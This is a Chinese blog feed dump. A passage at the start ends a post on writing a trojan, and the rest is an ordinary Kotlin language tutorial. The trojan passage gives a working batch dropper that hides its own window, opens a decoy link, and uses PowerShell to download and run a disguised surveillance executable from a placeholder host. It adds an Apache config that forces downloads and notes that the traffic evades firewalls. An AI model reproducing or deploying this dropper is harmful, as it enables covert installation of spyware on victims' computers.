\&quot;%~f0\&quot; hidden&#x27; -Windowstyle Hidden&quot;</span><br><span class="line">    exit</span><br><span class="line">)::首次启动：由于没有参数，脚本会通过 PowerShell 启动一个隐藏的命令提示符窗口，并且给它传递hidden参数，随后当前的可见窗口就会退出。当带有hidden参数启动脚本时，条件判断不成立，脚本会正常执行后续命令，而此时窗口是隐藏的。</span><br><span class="line">@echo off</span><br><span class="line">set &quot;pdfurl=https://blog.csdn.net/hanmo22357/article/details/127883179?ops_request_misc=%257B%2522request%255Fid%2522%253A%25227736a8fc7773cc256f8c17c470a8493a%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=7736a8fc7773cc256f8c17c470a8493a&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-127883179-null-null.142^v102^pc_search_result_base4&amp;utm_term=%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80&amp;spm=1018.2226.3001.4187&quot;::设置一个无害链接</span><br><span class="line">start &quot;&quot; &quot;%pdfurl%&quot;::打开</span><br><span class="line">@echo off</span><br><span class="line">powershell -Command &quot;Invoke-WebRequest -Uri &#x27;http://ip/downloads/XML_8d5a90c8e1f47893a4b2.html.exe&#x27; -OutFile &#x27;%~dp0XML_8d5a90c8e1f47893a4b2.html.exe&#x27;&quot;::设置一个监控软件下载链接，并下载到当前目录</span><br><span class="line">if exist &quot;%~dp0XML_8d5a90c8e1f47893a4b2.html.exe&quot; (</span><br><span class="line">    echo y</span><br><span class="line">    start &quot;&quot; &quot;%~dp0XML_8d5a90c8e1f47893a4b2.html.exe&quot;::执行</span><br><span class="line">) else (</span><br><span class="line">    echo n</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>下载链接我是通过apche搭了一个网站，并设置了一个强制下载的目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">    ServerAdmin webmaster@localhost</span><br><span class="line">    DocumentRoot /var/www/html</span><br><span class="line"></span><br><span class="line">    Alias /downloads &quot;/var/www/downloads&quot;</span><br><span class="line">    &lt;Directory &quot;/var/www/downloads&quot;&gt;</span><br><span class="line">        Options -Indexes</span><br><span class="line">        Require all granted</span><br><span class="line">        # 强制所有文件作为附件下载</span><br><span class="line">        Header always set Content-Disposition &quot;attachment&quot;</span><br><span class="line">        # 强制所有文件视为二进制</span><br><span class="line">        ForceType application/octet-stream</span><br><span class="line">        # 禁用内容压缩</span><br><span class="line">        SetEnv no-gzip 1</span><br><span class="line">    &lt;/Directory&gt;</span><br><span class="line">    ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log</span><br><span class="line">    CustomLog $&#123;APACHE_LOG_DIR&#125;/access.log combined</span><br><span class="line">&lt;/VirtualHost&gt;                  </span><br></pre></td></tr></table></figure><h3 id="最终实现"><a href="#最终实现" class="headerlink" title="最终实现"></a>最终实现</h3><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250615125433200.png" alt="image-20250615125433200"></p><p>这个是病毒本体</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250615125458044.png" alt="image-20250615125458044"></p><p>这个是被下载的监控软件（我使用ResourceHacker.exe，感谢苦瓜甘甜(wszjf) 师傅的分享这里附上链接<a href="https://www.52pojie.cn/forum.php?mod=viewthread&tid=1850851&highlight=Resource+Hacker%EF%BC%89%E6%8D%A2%E4%BA%86%E4%B8%80%E4%B8%AA%E5%9B%BE%E6%A0%87%EF%BC%8C%E8%B5%B7%E4%BA%86%E4%B8%80%E4%B8%AA%E4%B8%8D%E6%98%AF%E5%BE%88%E6%98%8E%E6%98%BE%E7%9A%84%E5%90%8D%E5%AD%97">https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=1850851&amp;highlight=Resource%2BHacker）换了一个图标，起了一个不是很明显的名字</a></p><p>执行流程</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250615130652133.png" alt="image-20250615130652133"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这个木马从开始写到写出来还是断断续续写了有几天，中途也有很多不了解的知识去学习，还有很多功能也没加，比如说会报病毒警告啊，没有做持久化啊，摄像头开启灯会亮等等，还是学的有点浅，以后会优化，还有我觉得好的地方就是软件的下载的运行全是在后台，因为是主动发数据所以不会触发防火墙</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.52pojie.cn/forum.php?mod=viewthread&tid=2024403&highlight=%C4%BE%EF%BF%BD%EF%BF%BD">【病毒分析】定向财务的钓鱼木马分析 - 吾爱破解 - 52pojie.cn</a></p><p><a href="https://blog.csdn.net/m0_73552988/article/details/147376815?ops_request_misc=%7B%22request_id%22:%222df5a9dd906120c46033a04eb2f51d89%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=2df5a9dd906120c46033a04eb2f51d89&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-147376815-null-null.142%5Ev102%5Epc_search_result_base4&utm_term=%E6%B3%A8%E5%86%8C%E8%A1%A8&spm=1018.2226.3001.4187">详解Windows（五）——注册表_windows注册表-CSDN博客</a></p><p><a href="https://www.52pojie.cn/forum.php?mod=viewthread&tid=2024570&extra=page=1&filter=typeid&typeid=62">【逆向复现】PyInstaller简单复现 - 吾爱破解 - 52pojie.cn</a></p><p><a href="https://www.52pojie.cn/thread-2035784-1-1.html">论黑客如何从bat到py到donut到ps1层层包裹木马，揭秘木马神秘运行流程 - 吾爱破解 - 52pojie.cn</a></p>]]></content>
      
      
      <categories>
          
          <category> re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 木马 </tag>
            
            <tag> 病毒 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kotlin语言学习</title>
      <link href="/2025/06/04/%E7%BC%96%E7%A8%8B/kotlin%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2025/06/04/%E7%BC%96%E7%A8%8B/kotlin%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="kotlin语言学习"><a href="#kotlin语言学习" class="headerlink" title="kotlin语言学习"></a>kotlin语言学习</h1><p><strong>前言</strong></p><p>笔者学习<code>kotlin</code>的原因，笔者这段时间学习安卓逆向，一直想了解安卓开发，刚好这次工程实践老师提出除了用<code>python，c</code>等常规语言，也是一选择使用安卓软件展示研究成果，故笔者选择学习<code>kotlin</code>语言来完成这次实践</p><h2 id="为什么学习kotlin"><a href="#为什么学习kotlin" class="headerlink" title="为什么学习kotlin"></a>为什么学习kotlin</h2><p>从2019年起，<code>kotlin</code>已经被谷歌官方列为安卓开发的首要语言。<code>jetpack</code>库优先支持<code>kotlin</code>，开发工具对<code>kotlin</code>也更加完善，使用<code>kotlin</code>可以拥有更少的代码量，空安全，协程（简化异步任务），并且因为最终两者都是被编译为JVM字节码，所以两者的性能差异几乎没有</p><h2 id="kotlin是混合范式语言"><a href="#kotlin是混合范式语言" class="headerlink" title="kotlin是混合范式语言"></a>kotlin是混合范式语言</h2><p>我们都知道一般的开发语言我们都分为解释型和编译型，我理解的这两种是，解释性是你写的代码被执行的时候，是一句一句被执行的，执行到那一句的之后再将那一句转换为机器可以识别的二进制码，而编译型语言是直接将你写好的代码全部转换为机器可以识别的机器码这样再次执行的时候就不需要再去一句一句的识别，一般来说编译性语言的代码的执行效率都要优于解释型语言</p><p>比如我们常见的c是编译型，<code>python</code>是解释型，而<code>java</code>是混合范式，所谓的混合型就是即是编译型，又是解释性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. 编译阶段：</span><br><span class="line">   - Java 源代码（.java）被编译成字节码（.class），这一步由 javac 完成。</span><br><span class="line">   - 字节码是平台无关的中间代码，类似编译型语言的机器码，但并非直接执行。</span><br><span class="line">2. 解释阶段：</span><br><span class="line">   - 字节码由 JVM（Java 虚拟机）解释执行。</span><br><span class="line">   - JVM 还可能通过 JIT（Just-In-Time）编译器将热点代码动态编译为机器码以优化性能。</span><br></pre></td></tr></table></figure><p>所以对于JVM来说她并不在意你写入的是什么语言，她只在意最后要执行的文件是.class文件就行，所以我们的<code>kotlin</code>语言就是，她只需要你编写好后将你编写好的代码转为<code>class</code>文件让JVM执行就行，这也是为什么<code>java</code>和<code>koylin</code>性能差不多的原因</p><h2 id="程序员的第一句话’Hello-World-‘"><a href="#程序员的第一句话’Hello-World-‘" class="headerlink" title="程序员的第一句话’Hello World!‘"></a>程序员的第一句话’Hello World!‘</h2><p>安装android studio</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250603164254021.png" alt="image-20250603164254021"></p><p>一路next，下图位置改个地址，笔者的习惯是直接改到D盘</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250603164354347.png" alt="image-20250603164354347"></p><p>安装后创建新项目</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250603165151319.png" alt="image-20250603165151319"></p><p>语言默认是<code>kotlin</code>，项目路径还是调到d盘</p><p>创建文件</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250603221827136.png" alt="image-20250603221827136"></p><p>写入文件</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250603221804545.png" alt="image-20250603221804545"></p><p>成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fun main()&#123;</span><br><span class="line">    println(&quot;hello wrold!&quot;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实笔者这里配环境配了很久，因为梯子的流量快用玩了所以一直舍不得开梯子配环境，导致下载的很慢还一直失败，最后还是选择了使用钞能力（重新买了流量）才一下就配好</p><h2 id="语法学习"><a href="#语法学习" class="headerlink" title="语法学习"></a>语法学习</h2><p>与<code>c，java</code>等语言不同的是<code>kotlin</code>的每个语句最后不需要<code>;</code>结尾</p><p>与<code>java</code>不同的是在<code>kotlin</code>中 <code>==</code> 等价<code>java</code>中的<code>equals</code> ，<code>===</code> 等价<code>java</code>中的 <code>==</code></p><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><h4 id="变量的声明"><a href="#变量的声明" class="headerlink" title="变量的声明"></a>变量的声明</h4><p>在<code>kotlin</code>的世界中需要用 <code>var</code>和<code>val</code>声明变量是可变的还是不可变的变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var a=1 可变变量</span><br><span class="line">val a=1 不可变变量</span><br></pre></td></tr></table></figure><p>记忆小技巧：<code>val</code>相当于<code>java</code>中对变量声明的<code>final</code>，都是以<code>L</code>结尾的，所以带<code>L</code>的是不可变变量</p><h4 id="基本类型"><a href="#基本类型" class="headerlink" title="基本类型"></a>基本类型</h4><p>一门语言的学习都需要学习他的基本类型，而在<code>Kotlin</code>中，<strong>基本类型（Primitive Types）仍然存在</strong>，但它们在语言层面被设计成<strong>表现为对象类型</strong>（即可以调用成员函数和属性）。</p><table><thead><tr><th>Java基本类型</th><th>Kotlin对象类型</th><th>对象类型说明</th></tr></thead><tbody><tr><td>int</td><td>Int</td><td>整型</td></tr><tr><td>long</td><td>Long</td><td>长整型</td></tr><tr><td>short</td><td>Short</td><td>短整型</td></tr><tr><td>float</td><td>Float</td><td>单精度浮点型</td></tr><tr><td>double</td><td>Double</td><td>双精度浮点型</td></tr><tr><td>boolean</td><td>Boolean</td><td>布尔型</td></tr><tr><td>char</td><td>Char</td><td>字符型</td></tr><tr><td>byte</td><td>Byte</td><td>字节型</td></tr></tbody></table><p><strong>数组类型</strong></p><p>Kotlin 提供了数组类型来存储同种类型的元素，例如：</p><ul><li><strong>IntArray</strong>: 存储 <code>Int</code> 类型的数组。</li><li><strong>DoubleArray</strong>: 存储 <code>Double</code> 类型的数组。</li><li><strong>Array<T></strong>: 泛型数组，可以存储任意类型。</li></ul><h4 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">toByte(): Byte</span><br><span class="line">toShort(): Short</span><br><span class="line">toInt(): Int</span><br><span class="line">toLong(): Long</span><br><span class="line">toFloat(): Float</span><br><span class="line">toDouble(): Double</span><br><span class="line">toChar(): Char</span><br></pre></td></tr></table></figure><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h4 id="函数的声明"><a href="#函数的声明" class="headerlink" title="函数的声明"></a>函数的声明</h4><p><strong>无参无返回</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fun a()&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>有参有返回</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fun a(b : Int):Int&#123;</span><br><span class="line">return b</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="声明技巧"><a href="#声明技巧" class="headerlink" title="声明技巧"></a>声明技巧</h4><p>当代码只有一行时可以使用以下声明方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fun a(b : Int) : Int= b</span><br></pre></td></tr></table></figure><p>返回值也可以省略，kotlin有类型推导</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fun a(b : Int)= b</span><br></pre></td></tr></table></figure><h4 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h4><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">a(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="可变长参数函数"><a href="#可变长参数函数" class="headerlink" title="可变长参数函数"></a>可变长参数函数</h4><p>可变长参数（Variable-length arguments，简称 varargs）允许函数接受<strong>任意数量</strong>的同类型参数。可变长参数函数使用关键字vararg进行标识</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">package com.example.damo1</span><br><span class="line"></span><br><span class="line">fun vars(vararg v:Int)&#123;</span><br><span class="line">    for(vt in v)&#123;</span><br><span class="line">        print(vt)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 测试</span><br><span class="line">fun main() &#123;</span><br><span class="line">    vars(1,2,3,4,5)  // 输出12345</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="lambda-匿名函数"><a href="#lambda-匿名函数" class="headerlink" title="lambda(匿名函数)"></a>lambda(匿名函数)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fun main() &#123;</span><br><span class="line">// 一个接收两个Int参数并返回它们和的Lambda</span><br><span class="line">    val sum = &#123; a: Int, b: Int -&gt; a + b &#125;</span><br><span class="line"></span><br><span class="line">// 调用</span><br><span class="line">    println(sum(3, 5))  // 输出：8</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 测试</span><br><span class="line">fun main(args: Array&lt;String&gt;) &#123;</span><br><span class="line">    val sumLambda: (Int, Int) -&gt; Int = &#123;x,y -&gt; x+y&#125;</span><br><span class="line">    println(sumLambda(1,2))  // 输出 3</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上述两者表达方式均是lambda的表示方式</p><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 这是一个单行注释</span><br><span class="line"></span><br><span class="line">/* 这是一个多行的</span><br><span class="line">   块注释。 */</span><br></pre></td></tr></table></figure><h3 id="字符串模板"><a href="#字符串模板" class="headerlink" title="字符串模板"></a>字符串模板</h3><p><code>$</code> 表示一个变量名或者变量值</p><p><code>$varName</code> 表示变量值</p><p><code>$&#123;varName.fun()&#125;</code> 表示变量的方法返回值:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var a = 1</span><br><span class="line">// 模板中的简单名称：</span><br><span class="line">val s1 = &quot;a is $a&quot; //s1=a is 1</span><br><span class="line"></span><br><span class="line">a = 2</span><br><span class="line">// 模板中的任意表达式：</span><br><span class="line">val s2 = &quot;$&#123;s1.replace(&quot;is&quot;, &quot;was&quot;)&#125;, but now is $a&quot;//a2=a was 1, but now is 2</span><br></pre></td></tr></table></figure><h3 id="if和when语句"><a href="#if和when语句" class="headerlink" title="if和when语句"></a>if和when语句</h3><p>kotlin中的<code>if</code>语句和java中的相差不大，不过kotlin多了一种when选择语句</p><h4 id="when"><a href="#when" class="headerlink" title="when"></a>when</h4><p><code>when</code>语句和<code>if</code>语句相同的是最后都有一个<code>else</code>语句表示所有情况不达标时</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fun main()&#123;</span><br><span class="line">    val a : Int=1</span><br><span class="line">    when(a)&#123;</span><br><span class="line">        1-&gt;println(a)</span><br><span class="line">        2-&gt;println(a)</span><br><span class="line">        else -&gt; println(0)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>when实现参数检查</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">fun main()&#123;</span><br><span class="line">    val a : Int=1</span><br><span class="line">    c(a)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fun c(a:Number)&#123;</span><br><span class="line">    when(a) &#123;</span><br><span class="line">        is Int -&gt; println(&quot;Int&quot;)</span><br><span class="line">        is Double -&gt; println(&quot;Double&quot;)</span><br><span class="line">        else -&gt; println(0)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250604113921586.png" alt="image-20250604113921586"></p><p><strong>不对when进行传参</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">fun main()&#123;</span><br><span class="line">    val a : Int=1</span><br><span class="line">    c(a)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fun c(a:Number)&#123;</span><br><span class="line">    when&#123;</span><br><span class="line">        a is Int -&gt; println(&quot;Int&quot;)</span><br><span class="line">        a is Double -&gt; println(&quot;Double&quot;)</span><br><span class="line">        else -&gt; println(0)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">is 运算符检测一个对象是否是指定类型的实例</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250604113855354.png" alt="image-20250604113855354"></p><p><strong>使用{}可是处理多行数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">fun main()&#123;</span><br><span class="line">    val a : Int=1</span><br><span class="line">    c(a)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fun c(a:Number)&#123;</span><br><span class="line">    when(a) &#123;</span><br><span class="line">        is Int -&gt; &#123;</span><br><span class="line">            println(&quot;Int&quot;)</span><br><span class="line">            println(a)</span><br><span class="line">        &#125;</span><br><span class="line">        is Double -&gt; println(&quot;Double&quot;)</span><br><span class="line">        else -&gt; println(0)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250604114056992.png" alt="image-20250604114056992"></p><h3 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h3><p>在korlin中的循环表示方法有两种，<code>while</code>和<code>for in</code>，<code>while</code>和java相同我们主要讲<code>for in</code></p><p>学习<code>for in</code>之前我们首先了解区间</p><p><strong>区间</strong></p><p>在kotlin的表示中区间的表示方法是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 .. 10表示0到10</span><br></pre></td></tr></table></figure><p>而</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 until 10 表示0到9</span><br></pre></td></tr></table></figure><p>跳步表示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 .. 10 step 2 表示 0 2 4 6 8 10</span><br></pre></td></tr></table></figure><p>降序表示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 .. 10 downTo 1表示10到1</span><br></pre></td></tr></table></figure><h4 id="for"><a href="#for" class="headerlink" title="for"></a>for</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for(i in 区间)&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="类与对象"><a href="#类与对象" class="headerlink" title="类与对象"></a>类与对象</h3><p>okok，前面学的其实都是小虾米，关键的来了</p><h4 id="类的创建和对象初始化"><a href="#类的创建和对象初始化" class="headerlink" title="类的创建和对象初始化"></a>类的创建和对象初始化</h4><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250604152310642.png" alt="image-20250604152310642"></p><p>和创建kotlin文件一样不过这里是选择新建类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">package com.example.damo1</span><br><span class="line"></span><br><span class="line">fun main()&#123;</span><br><span class="line">    val l=lei()</span><br><span class="line">    l.a=1</span><br><span class="line">    l.b=2</span><br><span class="line">    l.add()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">package com.example.damo1</span><br><span class="line"></span><br><span class="line">class lei &#123;</span><br><span class="line">    var a:Int=0</span><br><span class="line">    var b:Int=0</span><br><span class="line">    fun add()&#123;</span><br><span class="line">        println(a+b)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250604152245495.png" alt="image-20250604152245495"></p><h4 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h4><p>类的继承是子类同通过：接上父类</p><p>这里我先创了两个类进行学习</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250604153113130.png" alt="image-20250604153113130"></p><p>我们规定儿子可以学习，爸爸可以工作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">package com.example.damo1</span><br><span class="line"></span><br><span class="line">class son &#123;</span><br><span class="line">    fun son_do()&#123;</span><br><span class="line">        println(&quot;i can study&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">package com.example.damo1</span><br><span class="line"></span><br><span class="line">class father &#123;</span><br><span class="line">    fun father_do()&#123;</span><br><span class="line">        println(&quot;i can work&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">package com.example.damo1</span><br><span class="line"></span><br><span class="line">fun main()&#123;</span><br><span class="line">    val s=son()</span><br><span class="line">    val f=father()</span><br><span class="line">    s.son_do()</span><br><span class="line">    f.father_do()</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250604153604699.png" alt="image-20250604153604699"></p><p>这里我们可以看见这个代码可以正常的运行，之后儿子长大了要继承爸爸的工作，同时也在坚持学习</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250604153845483.png" alt="image-20250604153845483"></p><p>但是我们这里直接继承失败了，因为爸爸不公开他的工作，爸爸的工作是final的，这时我们可以给father类加上open</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250604154027625.png" alt="image-20250604154027625"></p><p>这时候的儿子就既可以学习也可以工作了</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250604154055848.png" alt="image-20250604154055848"></p><h4 id="构造"><a href="#构造" class="headerlink" title="构造"></a>构造</h4><p>kotlin中的构造分为主构造和次构造</p><h5 id="主构造"><a href="#主构造" class="headerlink" title="主构造"></a>主构造</h5><p>所谓的主构造就是直接跟在类后面的构造方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">package com.example.damo1</span><br><span class="line"></span><br><span class="line">class son(val name:String ,val time:Int) : father()&#123;</span><br><span class="line">    fun son_do()&#123;</span><br><span class="line">        println(name+&quot; can study and sustain &quot;+time)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 